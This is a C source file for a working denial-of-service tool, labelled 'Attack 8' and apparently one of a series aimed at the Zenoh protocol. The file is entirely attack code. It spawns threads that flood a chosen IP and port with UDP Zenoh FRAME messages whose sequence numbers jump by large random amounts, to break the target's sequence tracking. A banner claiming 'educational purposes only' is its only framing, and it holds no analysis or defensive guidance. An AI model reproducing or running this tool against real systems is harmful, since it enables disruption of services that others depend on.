/*
 * Attack 8: Sequence Number Exhaustion
 * Rapidly exhausts sequence number space to cause tracking issues
 * 
 * Compile: gcc -o attack8_seqexhaust attack_8_sequence_exhaustion.c -pthread
 * Run: ./attack8_seqexhaust <target_ip> <target_port> <threads>
 * 
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>

#define Z_MSG_FRAME 0x00
#define Z_FLAG_RELIABLE 0x20

static volatile int g_running = 1;
static atomic_ullong g_frames_sent = 0;

typedef struct {
    char *target_ip;
    int target_port;
    int thread_id;
} thread_args_t;

void signal_handler(int sig) {
    printf("\n[!] Stopping sequence exhaustion attack...\n");
    g_running = 0;
}

size_t encode_zint(unsigned char *buf, unsigned long long value) {
    size_t i = 0;
    while (value > 0x7F) {
        buf[i++] = (unsigned char)((value & 0x7F) | 0x80);
        value >>= 7;
    }
    buf[i++] = (unsigned char)(value & 0x7F);
    return i;
}

void* attack_thread(void *arg) {
    thread_args_t *args = (thread_args_t*)arg;
    int sock;
    struct sockaddr_in target_addr;
    unsigned char buffer[256];
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[-] Thread %d: Socket failed\n", args->thread_id);
        free(args);
        return NULL;
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    
    printf("[+] Thread %d started (exhausting sequence space)\n", args->thread_id);
    
    // Start with different base for each thread to cover more space
    unsigned long long seq = (unsigned long long)args->thread_id * 1000000000ULL;
    unsigned long local_count = 0;
    
    while (g_running) {
        for (int i = 0; i < 100; i++) {
            size_t offset = 0;
            
            // FRAME header
            buffer[offset++] = Z_MSG_FRAME | Z_FLAG_RELIABLE;
            
            // Sequence number (jump by large amounts)
            offset += encode_zint(buffer + offset, seq);
            
            // Minimal payload
            buffer[offset++] = 0x00;
            
            sendto(sock, buffer, offset, 0,
                  (struct sockaddr*)&target_addr, sizeof(target_addr));
            
            // Jump sequence numbers by large amounts
            seq += 10000 + (rand() % 100000);
            
            atomic_fetch_add(&g_frames_sent, 1);
            local_count++;
        }
        
        if (local_count % 10000 == 0) {
            printf("[Thread %d] Seq now at: %llu (%lu frames sent)\n",
                   args->thread_id, seq, local_count);
        }
        
        usleep(100);
    }
    
    close(sock);
    printf("[*] Thread %d stopped at seq=%llu\n", args->thread_id, seq);
    free(args);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <threads>\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Sequence Number Exhaustion         ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Threads: %d\n", num_threads);
    printf("[*] Strategy: Jump sequence numbers by 10K-100K\n\n");
    
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    
    pthread_t threads[num_threads];
    time_t start = time(NULL);
    
    for (int i = 0; i < num_threads; i++) {
        thread_args_t *args = malloc(sizeof(thread_args_t));
        args->target_ip = target_ip;
        args->target_port = target_port;
        args->thread_id = i;
        pthread_create(&threads[i], NULL, attack_thread, args);
    }
    
    printf("[+] Attack started!\n\n");
    
    while (g_running) {
        sleep(5);
        unsigned long long total = atomic_load(&g_frames_sent);
        time_t elapsed = time(NULL) - start;
        printf("[*] Frames sent: %llu | Rate: %.2f fps\n",
               total, elapsed > 0 ? (double)total / elapsed : 0.0);
    }
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║          Final Statistics                  ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Total Frames: %-28llu ║\n", (unsigned long long)atomic_load(&g_frames_sent));
    printf("║ Duration:     %-28ld ║\n", time(NULL) - start);
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}